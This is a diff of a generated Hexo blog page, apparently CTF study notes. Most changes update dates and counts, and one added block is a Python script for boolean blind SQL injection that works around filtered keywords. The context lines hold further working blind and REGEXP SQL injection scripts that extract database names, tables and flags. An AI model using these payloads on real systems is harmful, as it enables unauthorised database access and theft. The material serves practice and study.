@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235209264.png">
 <meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235456704.png">
 <meta property="article:published_time" content="2023-01-02T18:13:58.138Z">
-<meta property="article:modified_time" content="2023-01-16T16:22:27.652Z">
+<meta property="article:modified_time" content="2023-03-24T09:01:00.359Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/beiwang/image-20230102235209264.png">
@@ -133,7 +133,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">105</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">106</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -221,7 +221,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-01-17 00:22:27" itemprop="dateModified" datetime="2023-01-17T00:22:27+08:00">2023-01-17</time>
+                <time title="修改时间：2023-03-24 17:01:00" itemprop="dateModified" datetime="2023-03-24T17:01:00+08:00">2023-03-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -595,6 +595,9 @@
 
 <h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;121.43.141.153:60056&#x2F;error.php?code&#x3D;&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while (True):</span><br><span class="line">    i &#x3D; i + 1</span><br><span class="line">    head &#x3D; 32</span><br><span class="line">    tail &#x3D; 127</span><br><span class="line">    while (head &lt; tail):</span><br><span class="line">        mid &#x3D; (head + tail) &gt;&gt; 1</span><br><span class="line">        #payload &#x3D; &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span><br><span class="line">        #payload &#x3D; &quot;if(ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema&#x3D;database())),%d,1))&gt;%d,1,0)&quot; % (i,mid)</span><br><span class="line">        #payload &#x3D; &quot;if(ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_name like &#39;flag&#39;)),%d,1))&gt;%d,404,403)&quot; % (i,mid)</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select flag from fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot; % (i,mid)</span><br><span class="line">        r &#x3D; requests.get(url + payload)</span><br><span class="line">        </span><br><span class="line">        if &quot;404&quot; in r.text:</span><br><span class="line">            head &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            # print(r.text)</span><br><span class="line">            tail &#x3D; mid</span><br><span class="line">    last &#x3D; result</span><br><span class="line">    if head !&#x3D; 32:</span><br><span class="line">        result +&#x3D; chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
 
+<p>没有 union substr mid sleep</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;xxx&#x2F;index.php?act&#x3D;search&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    right &#x3D; 127</span><br><span class="line">    left &#x3D; 32</span><br><span class="line">    while left &lt; right:</span><br><span class="line">        mid &#x3D; (left + right)&#x2F;&#x2F;2</span><br><span class="line">        paylaod &#x3D; &#123;</span><br><span class="line">        &quot;keyword&quot;:f&quot;aoliao%&#39;and\&quot;1\&quot;&#x3D;if(ord(right((select(group_concat(flag))from(flag)),&#123;i&#125;))&gt;&#123;mid&#125;,1,0)#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        a &#x3D; requests.post(url,data&#x3D;paylaod).text</span><br><span class="line">        if &quot;ID:724&quot; in a:</span><br><span class="line">            left &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            right &#x3D; mid</span><br><span class="line">    flag &#x3D; chr(right) + flag</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
 
 
 <h2 id="REGEXP盲注"><a href="#REGEXP盲注" class="headerlink" title="REGEXP盲注"></a>REGEXP盲注</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">strs &#x3D; string.printable</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;x.x.x.x:8001&#x2F;Less-8&#x2F;index.php?id&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">database1 &#x3D; &quot;&#39; or database() regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line">table1 &#x3D; &quot;&#39; or (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line">cloumn1 &#x3D; &quot;&#39; or (select column_name from information_schema.columns where table_name&#x3D;\&quot;users\&quot; and table_schema&#x3D;database() limit 1,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line">data1 &#x3D; &quot;&#39; or (select username from users limit 0,1) regexp &#39;^&#123;&#125;&#39;--+&quot;</span><br><span class="line"></span><br><span class="line">payload &#x3D; database1</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1,40):</span><br><span class="line">        char &#x3D; &#39;&#39;</span><br><span class="line">        for j in strs:</span><br><span class="line">            payloads &#x3D; payload.format(name+j)</span><br><span class="line">            urls &#x3D; url+payloads</span><br><span class="line">            r &#x3D; requests.get(urls)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                name +&#x3D; j</span><br><span class="line">                print(j,end&#x3D;&#39;&#39;)</span><br><span class="line">                char &#x3D; j</span><br><span class="line">                break</span><br><span class="line">        if char &#x3D;&#x3D;&#39;#&#39;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
@@ -708,7 +711,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">105</span>
+          <span class="site-state-item-count">106</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -747,7 +750,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
